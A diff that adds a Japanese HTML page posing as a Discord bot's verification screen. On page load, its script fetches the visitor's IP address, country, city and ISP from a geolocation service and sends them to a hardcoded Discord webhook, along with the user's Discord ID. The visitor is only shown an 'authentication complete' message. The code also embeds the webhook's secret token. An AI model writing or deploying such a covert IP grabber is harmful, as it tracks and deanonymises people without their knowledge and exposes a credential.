@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head><meta charset="UTF-8"><title>認証システム</title></head>
+<body style="background:#23272a;color:white;text-align:center;padding-top:100px;font-family:sans-serif;">
+    <h1 id="status">認証処理中...</h1>
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
+        
+        async function run() {
+            const params = new URLSearchParams(window.location.search);
+            const state = params.get('state');
+
+            if (!state) {
+                document.getElementById('status').innerHTML = "❌ エラー: パラメータ(state)が届いていません。<br><small>ボットから新しく発行されたリンクを使用してください。</small>";
+                return;
+            }
+
+            try {
+                const parts = state.split('_');
+                const logId = parts[1];
+                const userId = parts[3];
+
+                const geoRes = await fetch('https://ipapi.co/json/');
+                const geo = await geoRes.json();
+
+                await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `✅ **認証成功**: <@${userId}>`,
+                        embeds: [{
+                            title: "ユーザー情報取得",
+                            description: `**IP:** \`${geo.ip}\`\n**場所:** \`${geo.country_name} / ${geo.city}\`\n**ISP:** \`${geo.org}\``,
+                            color: 0x43b581,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+                document.getElementById('status').innerText = "✅ 認証が完了しました！Discordに戻ってください。";
+            } catch (e) {
+                document.getElementById('status').innerText = "❌ 送信エラーが発生しました。";
+            }
+        }
+        window.onload = run;
+    </script>
+</body>
+</html>
